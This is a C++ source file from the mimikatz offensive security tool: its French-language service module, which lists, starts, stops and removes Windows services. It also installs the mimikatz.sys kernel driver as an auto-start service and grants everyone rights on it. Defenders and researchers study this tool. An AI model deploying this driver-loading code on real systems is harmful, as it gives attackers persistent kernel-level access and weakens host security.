/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_mimikatz_service.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"Liste les services et pilotes"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"Démarre un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"Arrête un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"Supprime un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mimikatz,	L"mimikatz",	L"Installe et/ou démarre le pilote mimikatz"));
	return monVector;
}

bool mod_mimikatz_service::start(vector<wstring> * arguments)
{
	wcout << L"Démarrage de \'";
	return genericFunction(mod_service::start, arguments);
}

bool mod_mimikatz_service::stop(vector<wstring> * arguments)
{
	wcout << L"Arrêt de \'";
	return genericFunction(mod_service::stop, arguments);
}

bool mod_mimikatz_service::remove(vector<wstring> * arguments)
{
	wcout << L"Suppression de \'";
	return genericFunction(mod_service::remove, arguments);
}

bool mod_mimikatz_service::genericFunction(PMOD_SERVICE_FUNC function, vector<wstring> * arguments)
{
	if(!arguments->empty())
	{
		wcout << arguments->front() << L"\' : ";
		if(function(&arguments->front(), NULL))
			wcout << L"OK";
		else
			wcout << L"KO ; " << mod_system::getWinError();
		wcout << endl;
	}
	else wcout << L"(null)\' - KO ; Nom de service manquant" << endl;

	return true;
}


bool mod_mimikatz_service::list(vector<wstring> * arguments)
{
	bool services_fs_drivers = true;
	bool services = false;
	bool fs = false;
	bool drivers = false;

	bool allstate = true;
	bool running = false;
	bool stopped = false;
	
	vector<mod_service::KIWI_SERVICE_STATUS_PROCESS> * vectorServices = new vector<mod_service::KIWI_SERVICE_STATUS_PROCESS>();
	if(mod_service::getList(vectorServices, (arguments->empty() ? NULL : &arguments->front())))
	{
		for(vector<mod_service::KIWI_SERVICE_STATUS_PROCESS>::iterator monService = vectorServices->begin(); monService != vectorServices->end(); monService++)
		{
			if(
				(
					(services && (monService->ServiceStatusProcess.dwServiceType & (SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS))) ||
					(fs && (monService->ServiceStatusProcess.dwServiceType & SERVICE_FILE_SYSTEM_DRIVER)) ||
					(drivers && (monService->ServiceStatusProcess.dwServiceType & SERVICE_KERNEL_DRIVER)) ||
					(services_fs_drivers)
				)
				&&
				(
					(running && monService->ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) ||
					(stopped && monService->ServiceStatusProcess.dwCurrentState == SERVICE_STOPPED) ||
					(allstate)
				)
			  )
			{			
				if(monService->ServiceStatusProcess.dwProcessId != 0)
					wcout << setw(5) << setfill(wchar_t(' ')) << monService->ServiceStatusProcess.dwProcessId;
				wcout << L'\t';
				
				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_INTERACTIVE_PROCESS)
					wcout << L"INTERACTIVE_PROCESS" << L'\t';
				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_FILE_SYSTEM_DRIVER)
					wcout << L"FILE_SYSTEM_DRIVER" << L'\t';
				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_KERNEL_DRIVER)
					wcout << L"KERNEL_DRIVER" << L'\t';
				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_WIN32_OWN_PROCESS)
					wcout << L"WIN32_OWN_PROCESS" << L'\t';
				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_WIN32_SHARE_PROCESS)
					wcout << L"WIN32_SHARE_PROCESS" << L'\t';

				switch(monService->ServiceStatusProcess.dwCurrentState)
				{
					case SERVICE_CONTINUE_PENDING:
						wcout << L"CONTINUE_PENDING";
						break;
					case SERVICE_PAUSE_PENDING:
						wcout << L"PAUSE_PENDING";
						break;
					case SERVICE_PAUSED:
						wcout << L"PAUSED";
						break;
					case SERVICE_RUNNING:
						wcout << L"RUNNING";
						break;
					case SERVICE_START_PENDING:
						wcout << L"START_PENDING";
						break;
					case SERVICE_STOP_PENDING:
						wcout << L"STOP_PENDING";
						break;
					case SERVICE_STOPPED:
						wcout << L"STOPPED";
						break;
				}

				wcout << L'\t' <<
					monService->serviceName << L'\t' <<
					monService->serviceDisplayName <<
					endl;
			}
		}
	}
	else
		wcout << L"mod_service::getList ; " << mod_system::getWinError() << endl;
			
	delete vectorServices;
	return true;
}

bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
{
	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
	{
		SC_HANDLE monService = NULL;
		if(!(monService = OpenService(monManager, L"mimikatz", SERVICE_START)))
		{
			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			{
				wcout << L"[*] Pilote mimikatz non présent, installation." << endl;
				
				wstring monPilote = L"mimikatz.sys";
				wstring monPiloteComplet = L"";
				if(mod_system::getAbsolutePathOf(monPilote, &monPiloteComplet))
				{
					bool fileExist = false;
					if(mod_system::isFileExist(monPiloteComplet, &fileExist) && fileExist)
					{
						if(monService = CreateService(monManager, L"mimikatz", L"mimikatz driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
						{
							wcout << L"[+] Création du pilote : OK" << endl;
							if(mod_secacl::addWorldToMimikatz(&monService))
								wcout << L"[+] Attribution des droits : OK";
							else
								wcout << L"[-] Attribution des droits : KO ; " << mod_system::getWinError();
							wcout << endl;
						}
						else wcout << L"[!] Impossible de créer le pilote ; " << mod_system::getWinError() << endl;
					}
					else wcout << L"[!] Le pilote ne semble pas exister ; " << mod_system::getWinError() << endl;
				}
				else wcout << L"[!] Impossible d\'obtenir le chemin absolu du pilote ; " << mod_system::getWinError() << endl;
			}
			else wcout << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
		}
		else wcout << L"[*] Pilote mimikatz déjà présent" << endl;
		
		if(monService)
		{
			if(StartService(monService, 0, NULL) != 0)
				wcout << L"[+] Démarrage du pilote : OK";
			else
				wcout << L"[-] Démarrage du pilote : KO ; " << mod_system::getWinError();
			wcout << endl;
			CloseServiceHandle(monService);
		}
		
		CloseServiceHandle(monManager);
	}
	else wcout << L"[!] Impossible d\'ouvrir le gestionnaire de service pour création ; " << mod_system::getWinError() << endl;
	return true;
}